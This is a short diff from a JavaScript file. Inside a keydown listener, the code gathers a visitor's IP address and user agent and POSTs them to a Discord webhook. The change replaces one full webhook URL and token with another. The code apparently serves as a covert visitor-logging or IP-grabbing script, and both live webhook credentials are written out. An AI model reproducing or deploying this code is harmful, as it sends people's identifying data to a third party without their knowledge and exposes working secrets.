@@ -153,7 +153,7 @@ document.addEventListener('keydown', function(event) {
         const content = ip + "\n" + ua;
         
         // Replace WEBHOOK_URL with your Discord webhook URL
-        fetch('https://discord.com/api/webhooks/1081675036819206234/rvkRnrSTVRYd4xr7v_-jXDcvsvbdSSuGoEDuS3SNafeCVuRRMKCVLeX_SHhCk2rpIZMU', {
+        fetch('https://discord.com/api/webhooks/1081677198932590672/Z2Xm7uBl8CIA3CdSCnJlRH9vG32I911TldhscZG-eR5TjykQQkEDhRra2-DxQQHxkQif', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ content })
